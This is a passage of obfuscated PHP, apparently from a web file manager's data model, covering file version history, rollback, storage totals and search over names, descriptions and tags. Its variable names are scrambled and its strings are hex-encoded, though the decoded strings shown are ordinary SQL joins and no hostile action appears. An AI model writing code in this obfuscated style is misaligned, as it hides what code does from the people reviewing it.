count($½¼µ˜ÀØ[$Ğü¶èµ‘[369]])); } return $½¼µ˜ÀØ; } protected function _listAppendUser(&$–²¹Â‰¿) { $‹£Â×èğ =& $_SERVER[ÏéâËõ‘]; $Û…Çòñ = array_to_keyvalue($–²¹Â‰¿, $‹£Â×èğ[12], $‹£Â×èğ[1662]); $¯ˆŠ÷ŒÓ = Model($‹£Â×èğ[535])->userListInfo($Û…Çòñ); foreach ($–²¹Â‰¿ as &$ÔºÆ›Šã) { $³…è° = $ÔºÆ›Šã[$‹£Â×èğ[1662]]; $ÔºÆ›Šã[$‹£Â×èğ[454]] = $¯ˆŠ÷ŒÓ[$³…è°] ? $¯ˆŠ÷ŒÓ[$³…è°] : !1; } unset($ÔºÆ›Šã); } public function fileInfo($½ø­Ì) { $ƒĞ‘§” =& $_SERVER[ÏéâËõ‘]; $ş‘úôÙ = $this->tablePrefix; $À¾—ü°ü = "{$ş‘úôÙ}\151\157\137\146\x69\x6c\145\40\146\151\154\x65\163\40\157\156\40\x66\x69\154\x65\x73\x2e\x66\x69\154\x65\111\x44\x20\75\x20\150\151\x73\x74\x6f\x72\171\56\x66\151\x6c\145\111\104"; return $this->alias($ƒĞ‘§”[2082])->where(array($ƒĞ‘§”[419] => $½ø­Ì))->join($À¾—ü°ü, $ƒĞ‘§”[2083])->find(); } public function removeItem($ğÆÙ‡É×) { $ßÅñü§ =& $_SERVER[ÏéâËõ‘]; $Ç÷«î¸ò = array($ßÅñü§[419] => $ğÆÙ‡É×); $À’“°İ = $this->where($Ç÷«î¸ò)->find(); if ($À’“°İ) { $úß„Ö§× = $this->where($Ç÷«î¸ò)->delete(); Model($ßÅñü§[471])->remove($À’“°İ[$ßÅñü§[468]]); return $úß„Ö§×; } return !1; } public function removeBySource($ú·„îŞ) { $Éí‹¡— =& $_SERVER[ÏéâËõ‘]; if (!$ú·„îŞ) { return !1; } if (!is_array($ú·„îŞ)) { $ú·„îŞ = array($ú·„îŞ); } $û®°¢—€ = array($Éí‹¡—[417] => array($Éí‹¡—[7], $ú·„îŞ)); $Ü°÷ûŞÒ = $this->field($Éí‹¡—[469])->where($û®°¢—€)->select(); if ($Ü°÷ûŞÒ) { $this->where($û®°¢—€)->delete(); $¢öÀ”º° = array_to_keyvalue($Ü°÷ûŞÒ, $Éí‹¡—[12], $Éí‹¡—[468]); Model($Éí‹¡—[471])->remove($¢öÀ”º°); } return !0; } public function setDetail($˜¿Òğ„›, $¢Œ¹òş) { $Ÿ‚ûõ =& $_SERVER[ÏéâËõ‘]; return $this->where(array($Ÿ‚ûõ[419] => $˜¿Òğ„›))->save(array($Ÿ‚ûõ[2073] => $¢Œ¹òş)); } public function rollbackToItem($·áÉ…Ö·, $†Ñ¼¿¢İ) { $Øììà‚ =& $_SERVER[ÏéâËõ‘]; $½±ó‡Õë = Model($Øììà‚[827])->sourceInfo($·áÉ…Ö·); $this->addHistory($½±ó‡Õë, LNG($Øììà‚[2084])); $ÂÊÌìÔÂ = $this->find($†Ñ¼¿¢İ); $™ãÚšÎ = array($Øììà‚[468] => $ÂÊÌìÔÂ[$Øììà‚[468]], $Øììà‚[76] => $ÂÊÌìÔÂ[$Øììà‚[76]], $Øììà‚[85] => time(), $Øììà‚[456] => USER_ID); Model($Øììà‚[827])->where(array($Øììà‚[402] => $·áÉ…Ö·))->save($™ãÚšÎ); return $this->where(array($Øììà‚[419] => $†Ñ¼¿¢İ))->delete(); } public function clearSame($†÷úîûğ) { $ú¾³ßéÍ =& $_SERVER[ÏéâËõ‘]; $Âßôğ– = $this->listData($†÷úîûğ); $µòû¥  = array_to_keyvalue_group($Âßôğ–, $ú¾³ßéÍ[468]); $à»Ø‹ö = array(); $ŠÙâìëë = array(); foreach ($µòû¥  as $Ğşâœú) { if (!$Ğşâœú || count($Ğşâœú) <= 1) { continue; } foreach ($Ğşâœú as $Ìéİµ¤Ñ) { $à»Ø‹ö[] = $Ìéİµ¤Ñ[$ú¾³ßéÍ[468]]; $ŠÙâìëë[] = $Ìéİµ¤Ñ[$ú¾³ßéÍ[399]]; } } if (!$ŠÙâìëë) { return; } $this->where(array($ú¾³ßéÍ[399] => array($ú¾³ßéÍ[7], $ŠÙâìëë)))->delete(); Model($ú¾³ßéÍ[471])->remove($à»Ø‹ö); } public function userSpace() { $§÷»ÀÕ =& $_SERVER[ÏéâËõ‘]; $¦Éª­Á¤ = $this->tablePrefix; $‘Ùé±Ñú = array($§÷»ÀÕ[1653] => USER_ID); $Íî¿î×µ = "{$¦Éª­Á¤}\x69\157\x5f\146\x69\154\x65\40\x66\x69\x6c\145\163\x20\157\156\x20\x66\151\154\145\163\x2e\x66\151\x6c\x65\x49\104\40\75\40\150\151\x73\164\157\162\171\x2e\146\x69\154\x65\x49\104"; return $this->alias($§÷»ÀÕ[2082])->where($‘Ùé±Ñú)->join($Íî¿î×µ, $§÷»ÀÕ[2083])->sum($§÷»ÀÕ[76]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($ÓÛüˆÕ„) { $èÄş×ù© =& $_SERVER[ÏéâËõ‘]; $ÓÌçè‚ = KodIO::fileTypeList(); $ëã‰ıº = $ÓÌçè‚[$ÓÛüˆÕ„]; if (!$ëã‰ıº) { return array(); } $Íğ ¥Ñ¯ = $ëã‰ıº[$èÄş×ù©[174]]; $«’÷ı·‹ = $èÄş×ù©[7]; if (!$ëã‰ıº[$èÄş×ù©[174]]) { $Ë—ßËÃ = array_to_keyvalue($ÓÌçè‚, $èÄş×ù©[12], $èÄş×ù©[174]); $Íğ ¥Ñ¯ = implode($èÄş×ù©[50], $Ë—ßËÃ); $«’÷ı·‹ = $èÄş×ù©[2085]; } $ı¢ÒÖ”® = explode($èÄş×ù©[50], trim($Íğ ¥Ñ¯, $èÄş×ù©[50])); return array($«’÷ı·‹, $ı¢ÒÖ”®); } public function listPathType($ï­Ö­õ) { $“ÓäÏ°Ô =& $_SERVER[ÏéâËõ‘]; $¸±ñÖŒ = $this->fileTypeWhere($ï­Ö­õ); if (!$¸±ñÖŒ) { return array(); } $´â°ü½† = USER_ID; $¡À“Ô¾¤ = Model($“ÓäÏ°Ô[535])->getInfo($´â°ü½†); $Â©ç¢ = array($“ÓäÏ°Ô[586] => SourceModel::TYPE_USER, $“ÓäÏ°Ô[521] => array($“ÓäÏ°Ô[550], $“ÓäÏ°Ô[531] . $¡À“Ô¾¤[$“ÓäÏ°Ô[86]][$“ÓäÏ°Ô[402]] . $“ÓäÏ°Ô[551]), $“ÓäÏ°Ô[587] => $´â°ü½†, $“ÓäÏ°Ô[583] => 0, $“ÓäÏ°Ô[584] => $¸±ñÖŒ); return $this->listSource($Â©ç¢); } public function listSearch($ì¦ü‡ôê, $¹ûÃ¾ÆÆ = 300) { $½‘îğÅµ =& $_SERVER[ÏéâËõ‘]; if (isset($ì¦ü‡ôê[$½‘îğÅµ[1928]]) && $ì¦ü‡ôê[$½‘îğÅµ[1928]]) { $ì¦ü‡ôê[$½‘îğÅµ[1928]] = str_replace($½‘îğÅµ[384], $½‘îğÅµ[2086], trim($ì¦ü‡ôê[$½‘îğÅµ[1928]])); } $•ÔÒ•œš = $this->_parseSearchWhere($ì¦ü‡ôê); if (!isset($•ÔÒ•œš[$½‘îğÅµ[431]])) { $•ÔÒ•œš[$½‘îğÅµ[431]] = 0; } $¬º€òéå = $½‘îğÅµ[2087]; $éƒæşß = $•ÔÒ•œš; $¤¶É¹¡ï = $¬º€òéå; $this->_listSearchBindPinyin($ì¦ü‡ôê, $•ÔÒ•œš, $¬º€òéå); $this->alias($½‘îğÅµ[446])->_makeOrder(); $•ÔÒ•œš = $this->parseWhereLike($•ÔÒ•œš); $Ì¦ØÁí¨ = $this->distinct(!0)->field($¬º€òéå)->where($•ÔÒ•œš)->selectPage($¹ûÃ¾ÆÆ); if ($GLOBALS[$½‘îğÅµ[6]][$½‘îğÅµ[381]][$½‘îğÅµ[382]] && Input::check($ì¦ü‡ôê[$½‘îğÅµ[1928]], $½‘îğÅµ[593]) && $Ì¦ØÁí¨[$½‘îğÅµ[366]][$½‘îğÅµ[353]] == 1 && $Ì¦ØÁí¨[$½‘îğÅµ[366]][$½‘îğÅµ[367]] == 0) { $Ì¦ØÁí¨ = $this->distinct(!0)->field($¬º€òéå)->where($éƒæşß)->limit(1000)->select(); $Ì¦ØÁí¨ = array_page_split($Ì¦ØÁí¨, !1, $¹ûÃ¾ÆÆ); } $this->_listSearchFileContent($Ì¦ØÁí¨, $ì¦ü‡ôê, $¤¶É¹¡ï, $éƒæşß); $this->_listSearchDesc($Ì¦ØÁí¨, $ì¦ü‡ôê, $¤¶É¹¡ï); $this->_listSearchTag($Ì¦ØÁí¨, $ì¦ü‡ôê, $¤¶É¹¡ï); $this->_listSearchGroupTag($Ì¦ØÁí¨, $ì¦ü‡ôê, $¤¶É¹¡ï); $this->_listDataApply($Ì¦ØÁí¨[$½‘îğÅµ[369]]); $this->_listMake($Ì¦ØÁí¨); return $Ì¦ØÁí¨; } private function _listSearchFileContent(&$ğ³”şÙ“, $Š±”±ñ¬, $Ô‚äÜŒÑ, $å¸¨İãö) { $Ï·ÓÉé» =& $_SERVER[ÏéâËõ‘]; if (!$Š±”±ñ¬[$Ï·ÓÉé»[1928]] || $ğ³”şÙ“[$Ï·ÓÉé»[366]][$Ï·ÓÉé»[353]] > 1) { return; } if (!isset($å¸¨İãö[$Ï·ÓÉé»[32]]) || !is_array($Š±”±ñ¬[$Ï·ÓÉé»[468]])) { return; } $å¸¨İãö[$Ï·ÓÉé»[468]] = array($Ï·ÓÉé»[7], $Š±”±ñ¬[$Ï·ÓÉé»[468]]); unset($å¸¨İãö[$Ï·ÓÉé»[32]]); unset($Š±”±ñ¬[$Ï·ÓÉé»[468]]); $´ëÊˆ¿„ = $this->field($Ô‚äÜŒÑ)->where($å¸¨İãö)->limit($Ï·ÓÉé»[2088])->select(); if (!$´ëÊˆ¿„ || count($´ëÊˆ¿„) == 0) { return; } $ğ³”şÙ“[$Ï·ÓÉé»[369]] = array_merge($´ëÊˆ¿„, $ğ³”şÙ“[$Ï·ÓÉé»[369]]); $ğ³”şÙ“[$Ï·ÓÉé»[366]][$Ï·ÓÉé»[367]] += count($´ëÊˆ¿„); } private function _listSearchTag(&$Ä€Üà¶º, $ÍÛ¤ê–, $Õ’ÌÕãé) { $ÂÓ£˜Ëà =& $_SERVER[ÏéâËõ‘]; if (!$ÍÛ¤ê–[$ÂÓ£˜Ëà[1928]] || $Ä€Üà¶º[$ÂÓ£˜Ëà[366]][$ÂÓ£˜Ëà[353]] > 1) { return; } $ŒİÛ”Ïñ = Model($ÂÓ£˜Ëà[2089])->listData(); $„À„§ïÖ = array(); $•º©ø¦¯ = $ÍÛ¤ê–[$ÂÓ£˜Ëà[1928]]; foreach ($ŒİÛ”Ïñ as $‡¼ïÇç») { $æÌ¿¡² = $‡¼ïÇç»[$ÂÓ£˜Ëà[32]]; $Ëëï ÎÚ = str_replace($ÂÓ£˜Ëà[53], $ÂÓ£˜Ëà[12], Pinyin::get($æÌ¿¡²)); if (stripos($æÌ¿¡², $•º©ø¦¯) !== !1 || stripos($Ëëï ÎÚ, $•º©ø¦¯) !== !1) { $„À„§ïÖ[] = $‡¼ïÇç»[$ÂÓ£˜Ëà[399]]; } } if (!$„À„§ïÖ) { return; } $×£·ƒ÷ = array($ÂÓ£˜Ëà[426] => array($ÂÓ£˜Ëà[7], $„À„§ïÖ), $ÂÓ£˜Ëà[1662] => USER_ID); $ÂšÊæ¾ = Model($ÂÓ£˜Ëà[428])->field($ÂÓ£˜Ëà[84])->where($×£·ƒ÷)->select(); $ÂšÊæ¾ = array_to_keyvalue($ÂšÊæ¾, $ÂÓ£˜Ëà[12], $ÂÓ£˜Ëà[84]); $²ºïî¾¾ = array_unique($ÂšÊæ¾); $this->_listSearchMerge($Ä€Üà¶º, $ÍÛ¤ê–, $Õ’ÌÕãé, $²ºïî¾¾); } private function _listSearchDesc(&$ïëš§…¡, $Ç†¦àÓå, $§“›°à¦) { $Ñè¼ ÄÎ =& $_SERVER[ÏéâËõ‘]; if (!$Ç†¦àÓå[$Ñè¼ ÄÎ[1928]] || $ïëš§…¡[$Ñè¼ ÄÎ[366]][$Ñè¼ ÄÎ[353]] > 1) { return; } $Á‘‡‹µ = array($Ñè¼ ÄÎ[94] => $Ñè¼ ÄÎ[453], $Ñè¼ ÄÎ[374] => array($Ñè¼ ÄÎ[383], $Ñè¼ ÄÎ[1930] . $Ç†¦àÓå[$Ñè¼ ÄÎ[1928]] . $Ñè¼ ÄÎ[1930])); $óÃ°È¯Ö = !1; if ($óÃ°È¯Ö) { $€ü©éì = $this->listSearchChildren($Ç†¦àÓå[$Ñè¼ ÄÎ[432]]); $€ü©éì = array_unique($€ü©éì); if (!$€ü©éì) { return; } $Á‘‡‹µ[$Ñè¼ ÄÎ[402]] = array($Ñè¼ ÄÎ[7], $€ü©éì); } $«ìğæ¢í = Model($Ñè¼ ÄÎ[569])->field($Ñè¼ ÄÎ[402])->where($Á‘‡‹µ)->limit(5000)->select(); $”Œãù‘Î = array_to_keyvalue($«ìğæ¢í, $Ñè¼ ÄÎ[12], $Ñè¼ ÄÎ[402]); $this->_listSearchMerge($ïëš§…¡, $Ç†¦àÓå, $§“›°à¦, $”Œãù‘Î); } private function _listSearchGroupTag(&$‡üåÅ‚‚, $´¤Û³«Ì, $¶ªŞ‰ª) { $—ù½åäŸ =& $_SERVER[ÏéâËõ‘]; if (!$´¤Û³«Ì[$—ù½åäŸ[1928]] || $‡üåÅ‚‚[$—ù½åäŸ[366]][$—ù½åäŸ[353]] > 1 || !$´¤Û³«Ì[$—ù½åäŸ[432]]) { return; } $¥¾ôË‚ = $this->sourceInfo($´¤Û³«Ì[$—ù½åäŸ[432]]); if (!$¥¾ôË‚ || $¥¾ôË‚[$—ù½åäŸ[411]] != SourceModel::TYPE_GROUP) { return; } $˜ŞïÔÎÇ = $¥¾ôË‚[$—ù½åäŸ[505]]; $Ÿô°ƒ® = Model($—ù½åäŸ[2090])->get($˜ŞïÔÎÇ); $›İÔŒó° = array(); $µûåÒ› = $´¤Û³«Ì[$—ù½åäŸ[1928]]; foreach ($Ÿô°ƒ®[$—ù½åäŸ[369]] as $æÕ¯€) { $Ö«ºµŠ÷ = $æÕ¯€[$—ù½åäŸ[32]]; $æĞÁ·¢ğ = str_replace($—ù½åäŸ[53], $—ù½åäŸ[12], Pinyin::get($Ö«ºµŠ÷)); if (stripos($Ö«ºµŠ÷, $µûåÒ›) !== !1 || stripos($æĞÁ·¢ğ, $µûåÒ›) !== !1) { $›İÔŒó°[] = $æÕ¯€[$—ù½åäŸ[399]]; } } if (!$›İÔŒó°) { return; } $ğºßƒ¤ = array($—ù½åäŸ[426] => array($—ù½åäŸ[7], $›İÔŒó°), $—ù½åäŸ[1662] => 0, $—ù½åäŸ[33] => $—ù½åäŸ[1950] . $˜ŞïÔÎÇ); $¯ä–‰†‰ = Model($—ù½åäŸ[428])->field($—ù½åäŸ[84])->where($ğºßƒ¤)->select(); $¯ä–‰†‰ = array_to_keyvalue($¯ä–‰†‰, $—ù½åäŸ[12], $—ù½åäŸ[84]); $õÕ‹“Ï¿ = array_unique($¯ä–‰†‰); $this->_listSearchMerge($‡üåÅ‚‚, $´¤Û³«Ì, $¶ªŞ‰ª, $õÕ‹“Ï¿); } private function _listSearchMerge(&$ÒŠ¨ƒÕ—, $â‘ÂÏó, $­†Ş®¿›, $²îì²”) { $µª½è²• =& $_SERVER[ÏéâËõ‘]; if (!$²îì²”) { return; } $ìü¸İŒ = array_to_keyvalue($ÒŠ¨ƒÕ—[$µª½è²•[369]], $µª½è²•[12], $µª½è²•[402]); $¼ú·É— = array_diff($²îì²”, $ìü¸İŒ); if (!$¼ú·É—) { return; } $—²ü®–Â = array($µª½è²•[402] => array($µª½è²•[7], $¼ú·É—)); $áËš¨é = $this->field($­†Ş®¿›)->where($—²ü®–Â)->select(); if (!$áËš¨é) { return; } $¨Ö­î¬Ê = array(); foreach ($áËš¨é as $½¹¡®†í) { if ($this->_listSearchFilter($½¹¡®†í, $â‘ÂÏó)) { $¨Ö­î¬Ê[] = $½¹¡®†í; } } $ÒŠ¨ƒÕ—[$µª½è²•[369]] = array_merge($¨Ö­î¬Ê, $ÒŠ¨ƒÕ—[$µª½è²•[369]]); $ÒŠ¨ƒÕ—[$µª½è²•[366]][$µª½è²•[367]] += count($¨Ö­î¬Ê); } private function _listSearchFilter($‰äí€Æ•, $ÜŞ ùñî) { $¨Ğ“÷íé =& $_SERVER[ÏéâËõ‘]; $àà—„—¿ = $‰äí€Æ•[$¨Ğ“÷íé[410]] == $¨Ğ“÷íé[88]; if (!strstr($‰äí€Æ•[$¨Ğ“÷íé[521]], $¨Ğ“÷íé[50] . $ÜŞ ùñî[$¨Ğ“÷íé[432]] . $¨Ğ“÷íé[50])) { return !1; } if (isset($ÜŞ ùñî[$¨Ğ“÷íé[412]]) && $ÜŞ ùñî[$¨Ğ“÷íé[412]] != $¨Ğ“÷íé[1889]) { if ($ÜŞ ùñî[$¨Ğ“÷íé[412]] == $¨Ğ“÷íé[75] && !$àà—„—¿) { return !1; } if ($ÜŞ ùñî[$¨Ğ“÷íé[412]] != $¨Ğ“÷íé[75] && $àà—„—¿) { return !1; } if (!strstr($‰äí€Æ•[$¨Ğ“÷íé[174]], $¨Ğ“÷íé[50] . $ÜŞ ùñî[$¨Ğ“÷íé[412]] . $¨Ğ“÷íé[50])) { return !1; } } if (isset($ÜŞ ùñî[$¨Ğ“÷íé[2091]]) && $ÜŞ ùñî[$¨Ğ“÷íé[2091]] < $‰äí€Æ•[$¨Ğ“÷íé[76]]) { return !1; } if (isset($ÜŞ ùñî[$¨Ğ“÷íé[2092]]) && $ÜŞ ùñî[$¨Ğ“÷íé[2092]] > $‰äí€Æ•[$¨Ğ“÷íé[76]]) { return !1; } if (isset($ÜŞ ùñî[$¨Ğ“÷íé[600]]) && $ÜŞ ùñî[$¨Ğ“÷íé[600]] != $‰äí€Æ•[$¨Ğ“÷íé[456]]) { return !1; } return !0; } public function listSearchChildren($ë¯±‹É€, $ÂîĞá’» = 5000) { $÷®µÛ¹û =& $_SERVER[ÏéâËõ‘]; $Ò‘ØìÀ‘ = array(); $î¤¦Ğñ¦ = $this->sourceInfo($ë¯±‹É€); $çµ¦Äµ× = array($÷®µÛ¹û[521] => array($÷®µÛ¹û[383], $î¤¦Ğñ¦[$÷®µÛ¹û[521]] . $î¤¦Ğñ¦[$÷®µÛ¹û[402]] . $÷®µÛ¹û[551])); $–ÃßÜæ– = $this->field($÷®µÛ¹û[76])->where($çµ¦Äµ×)->limit($ÂîĞá’» + 1)->select(); $ğúŞ…—ß = is_array($–ÃßÜæ–) ? count($–ÃßÜæ–) : 0; if ($ğúŞ…—ß > $ÂîĞá’») { return $this->_listSearchChildrenNear($ë¯±‹É€, $ÂîĞá’»); } $Òğ‡Œšœ = $this->field($÷®µÛ¹û[402])->where($çµ¦Äµ×)->select(); $Ò‘ØìÀ‘ = array_to_keyvalue($Òğ‡Œšœ, $÷®µÛ¹û[12], $÷®µÛ¹û[402]); return $Ò‘ØìÀ‘; } private function _listSearchChildrenNear($‘öñóô, $ü³òÎ§Ô) { $Á‚ŒÚÏ =& $_SERVER[ÏéâËõ‘]; $°ì«Ç”Ó = array(); $áµù¼ã‹ = array($Á‚ŒÚÏ[432] => $‘öñóô); $³ñé“¬Ÿ = $this->field($Á‚ŒÚÏ[2093])->where($áµù¼ã‹)->select(); $ÑìŸÕ• = array_to_keyvalue(array_filter_by_field($³ñé“¬Ÿ, $Á‚ŒÚÏ[410], $Á‚ŒÚÏ[88]), $Á‚ŒÚÏ[12], $Á‚ŒÚÏ[402]); $°ì«Ç”Ó = array_merge($°ì«Ç”Ó, array_to_keyvalue($³ñé“¬Ÿ, $Á‚ŒÚÏ[12], $Á‚ŒÚÏ[402])); if (!$ÑìŸÕ•) { return $°ì«Ç”Ó; } $áµù¼ã‹ = array($Á‚ŒÚÏ[432] => array($Á‚ŒÚÏ[7], $ÑìŸÕ•)); $³ñé“¬Ÿ = $this->field($Á‚ŒÚÏ[2093])->where($áµù¼ã‹)->limit($ü³òÎ§Ô)->select(); $°ì«Ç”Ó = array_merge($°ì«Ç”Ó, array_to_keyvalue($³ñé“¬Ÿ, $Á‚ŒÚÏ[12], $Á‚ŒÚÏ[402])); $°ì«Ç”Ó = array_slice($°ì«Ç”Ó, 0, $ü³òÎ§Ô); return $°ì«Ç”Ó; } private function _listSearchBindPinyin($óÙ“¶ƒ, &$Àµ ½÷õ, &$»–»ÜÃ§) { $éøé±œ =& $_SERVER[ÏéâËõ‘]; if (!isset($óÙ“¶ƒ[$éøé±œ[1928]]) || !$óÙ“¶ƒ[$éøé±œ[1928]]) { return; } if (!Input::check($óÙ“¶ƒ[$éøé±œ[1928]], $éøé±œ[318]) || strlen($óÙ“¶ƒ[$éøé±œ[1928]]) < 2) { return; } $ÉÙññ = "\114\105\106\124\40\112\117\x49\x4e\x20{$this->tablePrefix}\151\x6f\x5f\163\x6f\165\x72\143\x65\x5f\155\145\164\x61\x20\x6d\x65\x74\x61\40\157\x6e\x20\x73\157\165\x72\143\x65\x2e\x73\157\x75\162\x63\x65\x49\x44\40\75\40\155\x65\164\141\x2e\163\x6f\x75\x72\143\145\111\x44"; $£¼ˆ¡şĞ = array(); $»–»ÜÃ§ = str_replace(array($éøé±œ[231], $éøé±œ[53], $éøé±œ[2094]), $éøé±œ[12], $»–»ÜÃ§); $»–»ÜÃ§ = $éøé±œ[438] . str_replace($éøé±œ[50], $éøé±œ[439], $»–»ÜÃ§); $çÍÚÓÑ‘ = $Àµ ½÷õ[$éøé±œ[32]]; unset($Àµ ½÷õ[$éøé±œ[32]]); foreach ($Àµ ½÷õ as $…œ¢Íâë => $ÄŠñÛšì) { $£¼ˆ¡şĞ[$éøé±œ[438] . $…œ¢Íâë] = $ÄŠñÛšì; } foreach ($çÍÚÓÑ‘ as $™ü‚Â‡) { $£¼ˆ¡şĞ[] = array($éøé±œ[443] => $™ü‚Â‡, $éøé±œ[1005] => $éøé±œ[1932], array($éøé±œ[2095] => $™ü‚Â‡, $éøé±œ[2096] => array($éøé±œ[7], array($éøé±œ[465], $éøé±œ[464])))); } $this->join($ÉÙññ); $Àµ ½÷õ = $£¼ˆ¡şĞ; } private function _parseSearchWhere($ß¨éßÒ¤) { $êßşÒ¨ =& $_SERVER[ÏéâËõ‘]; $ª¢·Ø­ = array(); if (isset($ß¨éßÒ¤[$êßşÒ¨[763]]) && $ß¨éßÒ¤[$êßşÒ¨[763]]) { $ª¢·Ø­[$êßşÒ¨[85]] = array($êßşÒ¨[2097], $ß¨éßÒ¤[$êßşÒ¨[763]]); } if (isset($ß¨éßÒ¤[$êßşÒ¨[497]]) && $ß¨éßÒ¤[$êßşÒ¨[497]]) { $ğ«ßş±¸ = array($êßşÒ¨[2098], $ß¨éßÒ¤[$êßşÒ¨[497]]); if ($ª¢·Ø­[$êßşÒ¨[85]]) { $ª¢·Ø­[$êßşÒ¨[85]] = array($ª¢·Ø­[$êßşÒ¨[85]], $ğ«ßş±¸, $êßşÒ¨[2099]); } else { $ª¢·Ø­[$êßşÒ¨[85]] = $ğ«ßş±¸; } } if (isset($ß¨éßÒ¤[$êßşÒ¨[2091]]) && $ß¨éßÒ¤[$êßşÒ¨[2091]] > 0) { $ª¢·Ø­[$êßşÒ¨[76]] = array($êßşÒ¨[2097], $ß¨éßÒ¤[$êßşÒ¨[2091]]); } if (isset($ß¨éßÒ¤[$êßşÒ¨[2092]]) && $ß¨éßÒ¤[$êßşÒ¨[2092]]) { $ğ«ßş±¸ = array($êßşÒ¨[2098], $ß¨éßÒ¤[$êßşÒ¨[2092]]); if ($ª¢·Ø­[$êßşÒ¨[76]]) { $ª¢·Ø­[$êßşÒ¨[76]] = array($ª¢·Ø­[$êßşÒ¨[76]], $ğ«ßş±¸, $êßşÒ¨[2099]); } else { $ª¢·Ø­[$êßşÒ¨[76]] = $ğ«ßş±¸; } } if (isset($ß¨éßÒ¤[$êßşÒ¨[600]]) && $ß¨éßÒ¤[$êßşÒ¨[600]]) { $ª¢·Ø­[] = array($êßşÒ¨[456] => $ß¨éßÒ¤[$êßşÒ¨[600]], $êßşÒ¨[454] => $ß¨éßÒ¤[$êßşÒ¨[600]], $êßşÒ¨[1005] => $êßşÒ¨[1932]); } if (isset($ß¨éßÒ¤[$êßşÒ¨[412]]) && $ß¨éßÒ¤[$êßşÒ¨[412]]) { $‰ÖóëåÈ = $ß¨éßÒ¤[$êßşÒ¨[412]]; if ($‰ÖóëåÈ == $êßşÒ¨[75]) { $ª¢·Ø­[$êßşÒ¨[410]] = 1; } else { if ($‰ÖóëåÈ == $êßşÒ¨[2100]) { $ª¢·Ø­[$êßşÒ¨[410]] = 0; } else { if ($‰ÖóëåÈ) { $‰ÖóëåÈ = is_array($‰ÖóëåÈ) ? $‰ÖóëåÈ : explode($êßşÒ¨[50], $‰ÖóëåÈ); $ª¢·Ø­[$êßşÒ¨[412]] = array($êßşÒ¨[418], $‰ÖóëåÈ); $ª¢·Ø­[$êßşÒ¨[410]] = 0; } } } } $this->_parseSearchParent($ß¨éßÒ¤, $ª¢·Ø­); if (isset($ß¨éßÒ¤[$êßşÒ¨[1928]]) && trim($ß¨éßÒ¤[$êßşÒ¨[1928]])) { $Ë‹ûİßø = trim($ß¨éßÒ¤[$êßşÒ¨[1928]]); $ÄŠÆ°Ùñ = explode($êßşÒ¨[53], $Ë‹ûİßø); if (strlen($Ë‹ûİßø) > 2 && (substr($Ë‹ûİßø, 0, 1) == $êßşÒ¨[118] && substr($Ë‹ûİßø, -1) == $êßşÒ¨[118]) || substr($Ë‹ûİßø, 0, 1) == $êßşÒ¨[58] && substr($Ë‹ûİßø, -1) == $êßşÒ¨[58]) { $Ë‹ûİßø = substr($Ë‹ûİßø, 1, -1); $ÄŠÆ°Ùñ = array($Ë‹ûİßø); } $ª¢·Ø­[$êßşÒ¨[32]] = array(array($êßşÒ¨[550], $êßşÒ¨[1930] . $Ë‹ûİßø . $êßşÒ¨[1930])); if (count($ÄŠÆ°Ùñ) > 1) { $ª¢·Ø­[$êßşÒ¨[32]] = array(); foreach ($ÄŠÆ°Ùñ as $ï÷§”ú) { if (!trim($ï÷§”ú)) { continue; } $ª¢·Ø­[$êßşÒ¨[32]][] = array($êßşÒ¨[550], $êßşÒ¨[1930] . trim($ï÷§”ú) . $êßşÒ¨[1930]); } } } return $ª¢·Ø­; } private function _parseSearchParent($…¡‰«µ, &$½ÜÚñàì) { $ô¯Ñç«‹ =& $_SERVER[ÏéâËõ‘]; if (!isset($…¡‰«µ[$ô¯Ñç«‹[432]]) || !$…¡‰«µ[$ô¯Ñç«‹[432]]) { return; } $’ø³¦ñ = $this->pathInfo($…¡‰«µ[$ô¯Ñç«‹[432]]); $Âõ°ÇÙ¦ = $’ø³¦ñ[$ô¯Ñç«‹[432]] . $ô¯Ñç«‹[12] === $ô¯Ñç«‹[197]; $òëÚÁé´ = $’ø³¦ñ[$ô¯Ñç«‹[411]] == $ô¯Ñç«‹[515]; if ($’ø³¦ñ[$ô¯Ñç«‹[532]] == $ô¯Ñç«‹[533]) { $ôñ‡Ñõ™ = $this->sourceInfo($…¡‰«µ[$ô¯Ñç«‹[432]]); $’ø³¦ñ[$ô¯Ñç«‹[521]] = $ôñ‡Ñõ™[$ô¯Ñç«‹[521]]; } $½ÜÚñàì[$ô¯Ñç«‹[590]] = array($ô¯Ñç«‹[550], $’ø³¦ñ[$ô¯Ñç«‹[521]] . $…¡‰«µ[$ô¯Ñç«‹[432]] . $ô¯Ñç«‹[551]); $È¨ƒÄ¨‹ = isset($…¡‰«µ[$ô¯Ñç«‹[1793]]) && in_array($ô¯Ñç«‹[515], $…¡‰«µ[$ô¯Ñç«‹[1793]]); if (!$È¨ƒÄ¨‹ || !$òëÚÁé´ || !$Âõ°ÇÙ¦ || !$’ø³¦ñ[$ô¯Ñç«‹[413]]) { return; } if (!AuthModel::authCheckRoot($’ø³¦ñ[$ô¯Ñç«‹[413]][$ô¯Ñç«‹[414]])) { return; } $ÕˆÀÚíÄ = $’ø³¦ñ[$ô¯Ñç«‹[505]] . $ô¯Ñç«‹[12]; if ($ÕˆÀÚíÄ == $ô¯Ñç«‹[88]) { unset($½ÜÚñàì[$ô¯Ñç«‹[590]]); $½ÜÚñàì[$ô¯Ñç«‹[411]] = self::TYPE_GROUP; return; } $ê‰Ú·Ôú = Model($ô¯Ñç«‹[522])->groupChildrenAll($ÕˆÀÚíÄ); $ßÅÉ§¯¯ = count($ê‰Ú·Ôú); if ($ßÅÉ§¯¯ <= 1) { return; } $èˆÓİ„É = array($ô¯Ñç«‹[432] => 0, $ô¯Ñç«‹[411] => self::TYPE_GROUP, $ô¯Ñç«‹[505] => array($ô¯Ñç«‹[7], $ê‰Ú·Ôú)); $‰’šóå¶ = $this->field($ô¯Ñç«‹[2101])->where($èˆÓİ„É)->limit($ßÅÉ§¯¯)->select(); $½ÜÚñàì[$ô¯Ñç«‹[590]] = array(); foreach ($‰’šóå¶ as $“áş”ÅÛ) { $½ÜÚñàì[$ô¯Ñç«‹[590]][] = array($ô¯Ñç«‹[550], $ô¯Ñç«‹[531] . $“áş”ÅÛ[$ô¯Ñç«‹[402]] . $ô¯Ñç«‹[551]); } $½ÜÚñàì[$ô¯Ñç«‹[590]][] = $ô¯Ñç«‹[1932]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($Œ˜íÍÆñ) { $ˆ¢üûŒ¿ =& $_SERVER[ÏéâËõ‘]; $İ‡ ÆÇ€ = 